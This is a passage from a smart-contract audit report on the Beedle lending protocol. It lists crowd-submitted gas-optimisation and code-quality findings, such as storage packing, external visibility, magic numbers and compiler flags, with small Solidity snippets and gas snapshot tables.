_Submitted by [souilos](https://profiles.cyfrin.io/u/undefined), [ChainSentry](https://profiles.cyfrin.io/u/undefined), [0xNiloy](https://profiles.cyfrin.io/u/undefined), [timenov](https://profiles.cyfrin.io/u/undefined), [jaimebarrancos](https://profiles.cyfrin.io/u/undefined), [SAQ](https://profiles.cyfrin.io/u/undefined). Selected submission by: [timenov](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Staking.sol#L63

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Staking.sol#L67

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Staking.sol#L69

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Staking.sol#L83

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Staking.sol#L87

## Summary
Using `!=` when comparing with 0 saves gas.

## Recommendations
Use `!= 0` instead of `> 0`.
## <a id='G-15'></a>G-15. Use of magic numbers

_Submitted by [0xbug](https://profiles.cyfrin.io/u/undefined), [castleChain](https://profiles.cyfrin.io/u/undefined), [charlescheerful](https://profiles.cyfrin.io/u/undefined), [tsar](https://profiles.cyfrin.io/u/undefined), [inallhonesty](https://profiles.cyfrin.io/u/undefined), [ne0n](https://profiles.cyfrin.io/u/undefined), [0xNiloy](https://profiles.cyfrin.io/u/undefined), [jaimebarrancos](https://profiles.cyfrin.io/u/undefined), [codeslide](https://profiles.cyfrin.io/u/undefined), [ZedBlockchain](https://profiles.cyfrin.io/u/undefined), [timenov](https://profiles.cyfrin.io/u/undefined), [bloqarl](https://profiles.cyfrin.io/u/undefined), [Rolezn](https://profiles.cyfrin.io/u/undefined), [neocrao](https://profiles.cyfrin.io/u/undefined), [SolSaver](https://profiles.cyfrin.io/u/undefined), [crypt0mate](https://profiles.cyfrin.io/u/undefined), [bbash](https://profiles.cyfrin.io/u/undefined), [ch0bu](https://profiles.cyfrin.io/u/undefined), [fondevs](https://profiles.cyfrin.io/u/undefined), [0xackermann](https://profiles.cyfrin.io/u/undefined), [lian886](https://profiles.cyfrin.io/u/undefined), [gaslimit](https://profiles.cyfrin.io/u/undefined), [funderbrkrer](https://profiles.cyfrin.io/u/undefined). Selected submission by: [bbash](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L85

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L93

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L246

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L384

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L561

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L618

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L650

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L724

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L725

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol#L68

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol#L88

## Summary
Constants should be used instead of magic numbers. 
## Vulnerability Details
Use of constants is preferred over magic numbers. Even assembly can benefit from using readable constants instead of hex/numeric literals. 
Instances:

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L85

        if (_fee > 5000) revert FeeTooHigh();

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L93

        if (_fee > 500) revert FeeTooHigh();

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L246

        uint256 loanRatio = (debt * 10 ** 18) / collateral;

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L384

           uint256 loanRatio = (totalDebt * 10 ** 18) / loan.collateral;


https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L561

            uint256 govFee = (borrowerFee * loan.collateral) / 10000;


https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L618


            uint256 loanRatio = (debt * 10 ** 18) / collateral;


https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L650


                uint256 fee = (borrowerFee * (debt - debtToPay)) / 10000;


https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L724


        interest = (l.interestRate * l.debt * timeElapsed) / 10000 / 365 days;


https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L725


        fees = (lenderFee * interest) / 10000;


https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol#L68


                    uint256 _ratio = _diff * 1e18 / totalSupply;


https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol#L88


              uint256 _share = _supplied * _delta / 1e18;

## Impact
Use of constants improves the overall readability of the code.
## Tools Used
Manual Review and VS Code 
## Recommendations
 Use constants instead of magic numbers.
## <a id='G-16'></a>G-16. Named parameter mappings 

_Submitted by [inallhonesty](https://profiles.cyfrin.io/u/undefined), [0xNiloy](https://profiles.cyfrin.io/u/undefined), [codeslide](https://profiles.cyfrin.io/u/undefined), [ZedBlockchain](https://profiles.cyfrin.io/u/undefined), [Rolezn](https://profiles.cyfrin.io/u/undefined), [neocrao](https://profiles.cyfrin.io/u/undefined), [SolSaver](https://profiles.cyfrin.io/u/undefined), [ch0bu](https://profiles.cyfrin.io/u/undefined). Selected submission by: [ZedBlockchain](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Staking.sol#L19

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Staking.sol#L22

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Staking.sol#L24

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L70C30-L70C30

## Summary
There is a missed opportunity to use named parameter for public mappings

## Vulnerability Details
The projects use Solidity 0.8.19 and miss that from 0.8.18 a new feature allowing named parameters for public mappings was introduced.  See instances below without using them 
mapping(address => uint256) public supplyIndex; //Staking.sol line 19 
mapping(address => uint256) public balances; //Staking.sol line 21  
mapping(address => uint256) public claimable; //Staking.sol line 24
mapping(bytes32 => Pool) public pools; // Lender.sol line 70 

## Impact
Informational: 
1. This improves code readability and maintanability as it, 
2. Makes the mappings syntax similar to functions and events that take parameters and, 
3. Allows setting of fields in the ABI for mapping public getter functions


## Tools Used
Manual Analysis 

## Recommendations
Change to specify parameter names for all instances as in example below: 
mapping(address user => uint256 index) public supplyIndex; //Staking.sol line 19 

## <a id='G-17'></a>G-17. Unnecessary If condition in update() of Staking.sol

_Submitted by [souilos](https://profiles.cyfrin.io/u/undefined), [ZdravkoHr](https://profiles.cyfrin.io/u/undefined), [Vagner](https://profiles.cyfrin.io/u/undefined), [p4y4b13](https://profiles.cyfrin.io/u/undefined), [bauchibred](https://profiles.cyfrin.io/u/undefined), [leasowillow](https://profiles.cyfrin.io/u/undefined), [inallhonesty](https://profiles.cyfrin.io/u/undefined), [sonny2k](https://profiles.cyfrin.io/u/undefined), [bloqarl](https://profiles.cyfrin.io/u/undefined), [iurii2002](https://profiles.cyfrin.io/u/undefined), [topmark](https://profiles.cyfrin.io/u/undefined), [blockchainbard](https://profiles.cyfrin.io/u/undefined), [serialcoder](https://profiles.cyfrin.io/u/undefined), [hasanza](https://profiles.cyfrin.io/u/undefined), [ubermensch](https://profiles.cyfrin.io/u/undefined), [xfu](https://profiles.cyfrin.io/u/undefined), [funderbrkrer](https://profiles.cyfrin.io/u/undefined). Selected submission by: [sonny2k](https://profiles.cyfrin.io/u/undefined)._      
            


## Vulnerability Details
In line 65 https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol#L65, there already exists a condition if `_balance > balance` so that `_diff` is always > 0. However, there is a condition below checks if `_diff > 0`. And since _diff is always > 0, we don't need to check if `_ratio > 0`, which is unnecessary.

## Impact
Cause the function to compile slower and waste more gas.

## Tools Used
Manual

## Recommendations
Remove the condition of if (_diff > 0)

```diff
    function update() public {
        uint256 totalSupply = TKN.balanceOf(address(this));
        if (totalSupply > 0) {
            uint256 _balance = WETH.balanceOf(address(this));
            if (_balance > balance) {
                uint256 _diff = _balance - balance;
-               if (_diff > 0) {
                    uint256 _ratio = _diff * 1e18 / totalSupply;
-                   if (_ratio > 0) {
                      index = index + _ratio;
                      balance = _balance;
-                   }
-               }
            }
        }
    }
```

The completed code would be:
```
    function update() public {
        uint256 totalSupply = TKN.balanceOf(address(this));
        if (totalSupply > 0) {
            uint256 _balance = WETH.balanceOf(address(this));
            if (_balance > balance) {
                uint256 _diff = _balance - balance;
                uint256 _ratio = _diff * 1e18 / totalSupply;
                index = index + _ratio;
                balance = _balance;
            }
        }
    }
```

## <a id='G-18'></a>G-18. For the borrow(), repay() & startAuction() functions in Lender.sol the public visibility modifiers should be changed to external, to help optimize gas usage

_Submitted by [0xbug](https://profiles.cyfrin.io/u/undefined), [castleChain](https://profiles.cyfrin.io/u/undefined), [leasowillow](https://profiles.cyfrin.io/u/undefined), [0x9527](https://profiles.cyfrin.io/u/undefined), [HChang26](https://profiles.cyfrin.io/u/undefined), [alliums0517](https://profiles.cyfrin.io/u/undefined), [codeslide](https://profiles.cyfrin.io/u/undefined), [ZedBlockchain](https://profiles.cyfrin.io/u/undefined), [bloqarl](https://profiles.cyfrin.io/u/undefined), [timenov](https://profiles.cyfrin.io/u/undefined), [0xscsamurai](https://profiles.cyfrin.io/u/undefined), [Suzombie](https://profiles.cyfrin.io/u/undefined), [Rolezn](https://profiles.cyfrin.io/u/undefined), [neocrao](https://profiles.cyfrin.io/u/undefined), [SolSaver](https://profiles.cyfrin.io/u/undefined), [SAQ](https://profiles.cyfrin.io/u/undefined), [fondevs](https://profiles.cyfrin.io/u/undefined), [UrosZigic](https://profiles.cyfrin.io/u/undefined). Selected submission by: [0xscsamurai](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/d9718f2ca6521756624c017c90f3d4d4e80da90c/src/Lender.sol#L232

https://github.com/Cyfrin/2023-07-beedle/blob/d9718f2ca6521756624c017c90f3d4d4e80da90c/src/Lender.sol#L292

https://github.com/Cyfrin/2023-07-beedle/blob/d9718f2ca6521756624c017c90f3d4d4e80da90c/src/Lender.sol#L437

1. For the borrow() & repay() in Lender.sol the public visibility modifiers should be changed to external, to help optimize gas usage. Since it doesn't seem these functions are called internally at all, external modifier should be sufficient.

https://github.com/Cyfrin/2023-07-beedle/blob/d9718f2ca6521756624c017c90f3d4d4e80da90c/src/Lender.sol#L232
https://github.com/Cyfrin/2023-07-beedle/blob/d9718f2ca6521756624c017c90f3d4d4e80da90c/src/Lender.sol#L292

Recommendation:

Change from:

function borrow(Borrow[] calldata borrows) public {
and
function repay(uint256[] calldata loanIds) public {
and
function startAuction(uint256[] calldata loanIds) public {

to:

function borrow(Borrow[] calldata borrows) external {
and
function repay(uint256[] calldata loanIds) external {
and
function startAuction(uint256[] calldata loanIds) external {
## <a id='G-19'></a>G-19. Use assembly to check for `address(0)`

_Submitted by [0xbug](https://profiles.cyfrin.io/u/undefined), [souilos](https://profiles.cyfrin.io/u/undefined), [codeslide](https://profiles.cyfrin.io/u/undefined), [samshz](https://profiles.cyfrin.io/u/undefined), [xfu](https://profiles.cyfrin.io/u/undefined), [Suzombie](https://profiles.cyfrin.io/u/undefined), [Rolezn](https://profiles.cyfrin.io/u/undefined), [neocrao](https://profiles.cyfrin.io/u/undefined), [SolSaver](https://profiles.cyfrin.io/u/undefined), [mmm](https://profiles.cyfrin.io/u/undefined), [ziva](https://profiles.cyfrin.io/u/undefined), [SAQ](https://profiles.cyfrin.io/u/undefined), [ch0bu](https://profiles.cyfrin.io/u/undefined), [pratred](https://profiles.cyfrin.io/u/undefined). Selected submission by: [ch0bu](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary
Use assembly to check for `address(0)`

## Vulnerability Details
Saves around 60 gas per this [link](https://medium.com/@kalexotsu/solidity-assembly-checking-if-an-address-is-0-efficiently-d2bfe071331)

```
167	if (pools[poolId].lender == address(0)) {
240	if (pool.lender == address(0)) revert PoolConfig();
```
https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol

## Impact
Gas savings

## Tools Used
Manual review

## Recommendations
Consider using assembly to check for `address(0)`
## <a id='G-20'></a>G-20. caching variable of struct in one slot 

_Submitted by [castleChain](https://profiles.cyfrin.io/u/undefined), [Dharma](https://profiles.cyfrin.io/u/undefined), [Avci](https://profiles.cyfrin.io/u/undefined), [Rolezn](https://profiles.cyfrin.io/u/undefined), [mmm](https://profiles.cyfrin.io/u/undefined), [SAQ](https://profiles.cyfrin.io/u/undefined), [hasanza](https://profiles.cyfrin.io/u/undefined). Selected submission by: [castleChain](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/utils/Structs.sol#L4-L23

## Summary
store more than one variable in one storage slot save gas 
## Vulnerability Details
in struct Pool there are 3 variable can be packed into one storage slot . 
// uint96 maxLoanRatio   has a max value of 1**18 so uint96 is more efficient 
// uint80 auctionLength  has a max value of 3 days and this storage space can store 3**16 years 
// uint80 interest rate  has a max value of 1000*100 


## Impact
gas saving 
Each slot saved can avoid an extra Gas (20000 gas) for the first setting of the struct
store the variable in one storage slot is more gas efficient . 

## Tools Used
manual review 

## Recommendations
using 
// uint64 maxLoanRatio 
// uint24 auctionLength 
// uint24 interest rate 
instead of 
// uint256 maxLoanRatio 
// uint256 auctionLength 
// uint256 interest rate 
## <a id='G-21'></a>G-21. save storage slot 

_Submitted by [castleChain](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L63-L65

## Summary
cache the state variables
## Vulnerability Details
can store the `lenderFee` and the `borrowerFee` at one storage slot since they have max values  
max `lenderFee` is 5000 
max `borrowerFee` is 500 
so uint48 is very efficient for them and this store 3 state variable into one storge 
`uint48 lenderFee` 
`uint48 borrowerFee` 
`address feeReceiver `
## Impact
the gas saved is 20000*2
## Tools Used

## Recommendations
`uint48` is very efficient for them and this store 3 state variable into one storge 
`uint48 lenderFee`
`uint48 borrowerFee`
`address feeReceiver`
## <a id='G-22'></a>G-22. an important value does not been returned

_Submitted by [castleChain](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L232-L287



## Vulnerability Details
function borrow should return the `loanId` 
## Impact
reduce the accessibility of the `loanId` 
## Tools Used
manual review 
## Recommendations
funtion `borrow` returns `uint256 loanId` 
## <a id='G-23'></a>G-23. Use better name in sellProfits function

_Submitted by [mahdirostami](https://profiles.cyfrin.io/u/undefined), [0xDemuth](https://profiles.cyfrin.io/u/undefined), [0xWeb3boy](https://profiles.cyfrin.io/u/undefined), [SAQ](https://profiles.cyfrin.io/u/undefined). Selected submission by: [mahdirostami](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Fees.sol#L26

## Summary
In the sellProfits function, use amount_in and amount_out instead of amount.

```diff
-        uint256 amount = IERC20(_profits).balanceOf(address(this));
+        uint256 amount_in = IERC20(_profits).balanceOf(address(this));
 
         ISwapRouter.ExactInputSingleParams memory params = ISwapRouter
             .ExactInputSingleParams({
@@ -34,12 +34,12 @@ contract Fees {
                 fee: 3000,
                 recipient: address(this),
                 deadline: block.timestamp,
-                amountIn: amount,
+                amountIn: amount_in,
                 amountOutMinimum: 0,
                 sqrtPriceLimitX96: 0
             });
 
-        amount = swapRouter.exactInputSingle(params);
+        uint256 amount_out = swapRouter.exactInputSingle(params);
```
## <a id='G-24'></a>G-24. [L-07] interface Staking.FeeDistribution is not used

_Submitted by [leasowillow](https://profiles.cyfrin.io/u/undefined), [nisedo](https://profiles.cyfrin.io/u/undefined), [pxng0lin](https://profiles.cyfrin.io/u/undefined), [alliums0517](https://profiles.cyfrin.io/u/undefined), [bloqarl](https://profiles.cyfrin.io/u/undefined), [timenov](https://profiles.cyfrin.io/u/undefined), [lalanda](https://profiles.cyfrin.io/u/undefined), [pina](https://profiles.cyfrin.io/u/undefined), [maroutis](https://profiles.cyfrin.io/u/undefined). Selected submission by: [pina](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol#L7-L9

## Summary
The Staking.sol contract declares an interface called FeeDistribution but it is not used in the contract.

## Impact
It confuses the declaration of a function inside the interface called `claim` because inside the contract there is another function `claim`

## Tools Used
Manual code review

## Recommendations
Remove the interface declaration
## <a id='G-25'></a>G-25. Gas1-CompilerFlag-CarlosAlegreUr

_Submitted by [charlescheerful](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol

https://github.com/Cyfrin/2023-07-beedle/blob/main/foundry.toml

# Summary 📌

Following recent updates, client-tests have passed, achieving gas savings of **0.18%**. This optimization review focused solely on the `Lender.sol` contract, the only one with associated tests.

---

# Vulnerability Details 🔍

### Use `via_ir = true` for an Enhanced Compiler Process 🛠️

The `via_ir` flag in the `foundry.toml` file triggers a more optimized compiler. This change resulted in a **0.18%** improvement over the unoptimized contract.

**`foundry.toml` Configuration**:

```
(options...)
remappings = [...]
via_ir = true  <-- Set flag for optimization
```

> 🚧 **Note** ⚠️: Enabling `via_ir` prolongs the compilation process. Compilation-related tasks are expected to take quite a bit more of time when this flag is active.

> 📘 **Information** ℹ️: The `via_ir` flag instructs Foundry to utilize Intermediate Representation (IR). IR is a low-level language bridging high-level source code and machine code. This intermediate step allows for additional optimization techniques. Thats what the `_ir` means in `via_ir`, Intermediate Representation.

---

# Impact 📈

Metrics derived from gas consumption of the provided tests:

| _Optimization Method_ | _Optimized Gas_ | _Original Gas_ | _Gas Saved_ | _% Saved_ |
| --------------------- | --------------- | -------------- | ----------- | --------- |
| **Use of via_ir**     | 12,870,939      | 12,847,388     | 23,551      | **0.18%** |

<details> 
<summary> Test by test breakdown 🧑‍🔬 </summary>

> 🚧 **Notice** ⚠️: The optimization affects all the contract, so I've analyzed all the tests.

> 🚧 **Notice** ⚠️: Negative numbers in the `Gas Saved` column means the "optimization" increased the consumption of gas in that test. But the overall outcome in this case is positive so it can be considered an optimization.

| Test Name                              | Optimized Gas | Original Gas | Gas Saved |
| -------------------------------------- | ------------- | ------------ | --------- |
| LenderTest:test_startAuction           | 626,458       | 626,519      | 61        |
| LenderTest:testFuzz_buyLoan            | 820,537       | 822,978      | 2,441     |
| LenderTest:testFuzz_repay              | 508,429       | 509,918      | 1,489     |
| LenderTest:testFail_borrowTooLarge     | 245,932       | 246,264      | 332       |
| LenderTest:test_borrow                 | 615,740       | 616,289      | 549       |
| LenderTest:testFuzz_seize              | 604,236       | 604,712      | 476       |
| LenderTest:testFuzz_borrow             | 247,162       | 247,705      | 543       |
| LenderTest:test_giveLoan               | 851,476       | 853,996      | 2,520     |
| LenderTest:test_seize                  | 546,439       | 546,589      | 150       |
| LenderTest:test_createPool             | 238,918       | 240,654      | 1,736     |
| LenderTest:testFuzz_refinance          | 807,460       | 808,483      | 1,023     |
| LenderTest:testFail_repayNoTokens      | 617,720       | 617,778      | 58        |
| LenderTest:testFail_buyLoanTooLate     | 832,601       | 834,673      | 2,072     |
| LenderTest:testFail_buyLoanRateTooHigh | 832,822       | 835,171      | 2,349     |
| LenderTest:test_repay                  | 522,975       | 523,934      | 959       |
| LenderTest:test_buyLoan                | 854,506       | 857,706      | 3,200     |
| LenderTest:testFuzz_createPool         | 105,058       | 104,646      | -412      |
| LenderTest:testFail_borrowTooSmall     | 245,483       | 246,328      | 845       |
| LenderTest:test_refinance              | 848,406       | 850,199      | 1,793     |
| LenderTest:testFail_startAuction       | 621,394       | 621,888      | 494       |
| LenderTest:testFail_seizeTooEarly      | 631,900       | 632,300      | 400       |
| LenderTest:test_interest               | 621,736       | 622,209      | 473       |
| **TOTAL**                              | 12,847,388    | 12,870,939   | 23,551    |

Total saved percentage => **0.18%**.

> 📘 **Notice** ℹ️: The percentage has been calculated with these numbers from the TOTAL:
>
> ( 23,551 / 12,870,939 ) \* 100
>
> They mean:
>
> (totalGasSaved / originalGasCost) \* 100

 </details>

<details> 
<summary> Forge Snapshots Used 📸 </summary>

_**`Original`**_

```
LenderTest:testFail_borrowTooLarge() (gas: 246264)
LenderTest:testFail_borrowTooSmall() (gas: 246328)
LenderTest:testFail_buyLoanRateTooHigh() (gas: 835171)
LenderTest:testFail_buyLoanTooLate() (gas: 834673)
LenderTest:testFail_repayNoTokens() (gas: 617778)
LenderTest:testFail_seizeTooEarly() (gas: 632300)
LenderTest:testFail_startAuction() (gas: 621888)
LenderTest:testFuzz_borrow(uint256,uint256) (runs: 256, μ: 247705, ~: 247702)
LenderTest:testFuzz_buyLoan(uint256) (runs: 256, μ: 822978, ~: 833057)
LenderTest:testFuzz_createPool(uint256,uint256) (runs: 256, μ: 104646, ~: 22504)
LenderTest:testFuzz_refinance(uint256,uint256) (runs: 256, μ: 808483, ~: 808483)
LenderTest:testFuzz_repay(uint256) (runs: 256, μ: 509918, ~: 509917)
LenderTest:testFuzz_seize(uint256) (runs: 256, μ: 604712, ~: 605664)
LenderTest:test_borrow() (gas: 616289)
LenderTest:test_buyLoan() (gas: 857706)
LenderTest:test_createPool() (gas: 240654)
LenderTest:test_giveLoan() (gas: 853996)
LenderTest:test_interest() (gas: 622209)
LenderTest:test_refinance() (gas: 850199)
LenderTest:test_repay() (gas: 523934)
LenderTest:test_seize() (gas: 546589)
LenderTest:test_startAuction() (gas: 626519)
```

_**`Optimized`**_

```
LenderTest:testFail_borrowTooLarge() (gas: 245932)
LenderTest:testFail_borrowTooSmall() (gas: 245483)
LenderTest:testFail_buyLoanRateTooHigh() (gas: 832822)
LenderTest:testFail_buyLoanTooLate() (gas: 832601)
LenderTest:testFail_repayNoTokens() (gas: 617720)
LenderTest:testFail_seizeTooEarly() (gas: 631900)
LenderTest:testFail_startAuction() (gas: 621394)
LenderTest:testFuzz_borrow(uint256,uint256) (runs: 256, μ: 247162, ~: 247159)
LenderTest:testFuzz_buyLoan(uint256) (runs: 256, μ: 820537, ~: 830195)
LenderTest:testFuzz_createPool(uint256,uint256) (runs: 256, μ: 105058, ~: 22578)
LenderTest:testFuzz_refinance(uint256,uint256) (runs: 256, μ: 807460, ~: 807460)
LenderTest:testFuzz_repay(uint256) (runs: 256, μ: 508429, ~: 508428)
LenderTest:testFuzz_seize(uint256) (runs: 256, μ: 604236, ~: 605190)
LenderTest:test_borrow() (gas: 615740)
LenderTest:test_buyLoan() (gas: 854506)
LenderTest:test_createPool() (gas: 238918)
LenderTest:test_giveLoan() (gas: 851476)
LenderTest:test_interest() (gas: 621736)
LenderTest:test_refinance() (gas: 848406)
LenderTest:test_repay() (gas: 522975)
LenderTest:test_seize() (gas: 546439)
LenderTest:test_startAuction() (gas: 626458)
```

 </details>

---

# Tools Used 🛠️

- Manual audit
- Forge Snapshot
- Bash scripts tailored to analyze forge snapshots.

> 📘 **Notice** ℹ️: I've personally created the bash scripts. Here is a link to the github repo [Forge-Snapshots-Analyzer](https://github.com/CarlosAlegreUr/Forge-Snapshots-Analyzer).

---

# Recommendations 🎯

Implementing the proposed gas optimizations is recommended. This benefits both end-users and the protocol in terms of cost, while ensuring protocol security remains uncompromised as tests pass consistently.

> 🚧 **Note** ⚠️: If a significant vulnerability necessitating major code changes arises, this gas optimization technique remains relevant and applicable. Nonetheless some gas analysis as the one used here is always needed to make sure it's actually saving gas.

## <a id='G-26'></a>G-26. QA2-Refactor-CarlosAlegreUr

_Submitted by [charlescheerful](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol

## Summary 📌

The report aims to optimize the project's codebase using these software paradigms:

- **Divide and Conquer (DaC)**
- **Separation of Responsibilities (SoR)**

---

## Vulnerability Details 🔍

### A STRUCTURAL CHANGE ☢️

Monolithic architectures might offer some advantages in terms of gas efficiency, but with growing project complexity, it's vital to prioritize maintainability and flexibility. A clear separation of concerns, coupled with a DaC approach, can offer significant benefits.

**Recommendations**:

1️⃣ **Break down the responsibilities** of `Lender.sol` into two distinct contracts:

- **PoolsManager.sol**: Pool-related operations and management.
- **Lender.sol**: Lending-specific operations and management.

2️⃣ For **further modularity** adoption:

- **ILender.sol & IPoolsManager.sol**: Modularize events and easily grasp a view of the 2 contracts functions.

By adopting this restructured approach, each module will excel in its function, leading to a more robust and manageable system.

<details> <summary> Modularized Code Template 🗺️ </summary>

### Modularized Code Template 📜

> 🚧 **Note** ⚠️: The code below is just a template to guide you. It has not been tested and should not be relied upon. Moreover, while the intent is to simplify and reorganize, this restructuring might not be the most gas-efficient approach.

_**`Lender.sol`**_:

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
// Needed imports...

contract Lender is ILender, Ownable {
    uint256 public constant MAX_INTEREST_RATE = 100000;
    uint256 public constant MAX_AUCTION_LENGTH = 3 days;
    uint256 public lenderFee = 1000;
    uint256 public borrowerFee = 50;
    address public feeReceiver;

    // 🟢 Now we would get pools this way --> PoolsManager.getPool(poolId);
    PoolsManager public poolsManager; // <------- 🟢 To access pools info
    Loan[] public loans;

    constructor(address _poolsManager) Ownable(msg.sender) {
        poolsManager = PoolsManager(_poolsManager); // <-- 🟢 Constructor should change etc etc
    }

    function setLenderFee(uint256 _fee) external onlyOwner {}
    //REST OF FUNCS RELATED TO LENDING OPERATIONS
}
```

_**`PoolsManager.sol`**_:

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
// Needed imports...

contract PoolsManager is IPoolsManager, Ownable {
    uint256 public constant MAX_INTEREST_RATE = 100000;
    uint256 public constant MAX_AUCTION_LENGTH = 3 days;

    mapping(bytes32 => Pool) public pools;

    //  🟢 HERE!! Notice Owner should be the Lender.sol contract
    constructor() Ownable(msg.sender) {}

    function getPoolId(address lender, address loanToken, address collateralToken)
        public
        pure
        returns (bytes32 poolId)
    {}

    // 🟢 HERE!! NOTICE THE NEED FOR A NEW FUNCTION THAT ALLOWS INTERACTION BETWEEN LENDER AND POOLSMANAGER CONTRACTS
    function getPool(bytes32 poolId) public view returns (Pool memory) {
        return pools[poolId];
    }

    // REST OF FUNCS RELATED TO POOL MANAGEMENT OPERATIONS ...
}
```

_**`ILender.sol`**_:

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
// + Some extra imports...
import "../src/utils/Structs.sol";

interface ILender {
    // Lender related events...
    event Borrowed();
    event Repaid();
    // Function signatures + documentation. NatSpec used is recommended.
}
```

_**`IPoolsManager.sol`**_:

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
// + Some extra imports...

interface IPoolsManager {
    // PoolManagement related events...
    event PoolCreated(bytes32 indexed poolId, Pool pool);
    event PoolUpdated(bytes32 indexed poolId, Pool pool);
    // Function signatures + documentation.
}
```

</details>

---

## Impact 📈

DaC and SoR offer multiple benefits, including:

- They make error detection more traceable, easier debugging.
- Better readability when declaring the intentions of each part of the codebase.
- If an error occurs, these paradigms can help prevent its propagation throughout the system.

---

## Tools Used 🛠️

- Manual audit.
- Solidity Visual Developer VSPlugin for visualizing function dependencies.

---

## Recommendations 🎯

Allocate dedicated time during the development phase to strategic codebase design, emphasizing clarity and scalability. Such an approach, though possibly more time-consuming initially, long-term its more efficient for extensive projects like this one.

## <a id='G-27'></a>G-27. Wrong comment in `setPool` function

_Submitted by [charlescheerful](https://profiles.cyfrin.io/u/undefined), [pacelli](https://profiles.cyfrin.io/u/undefined), [hash](https://profiles.cyfrin.io/u/undefined), [devival](https://profiles.cyfrin.io/u/undefined). Selected submission by: [devival](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L141-L142

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L148

## Vulnerability Details and Recommendations

In the `Lender.sol` contract's `setPool` function, replace:
```
        // check if they already have a pool balance
        poolId = getPoolId(p.lender, p.loanToken, p.collateralToken);

        ...

        uint256 currentBalance = pools[poolId].poolBalance;
```
with:
```
        // get pool id
        poolId = getPoolId(p.lender, p.loanToken, p.collateralToken);

        ...

        // check if they already have a pool balance
        uint256 currentBalance = pools[poolId].poolBalance;

```

## <a id='G-28'></a>G-28. NatSpec documentation for function is missing

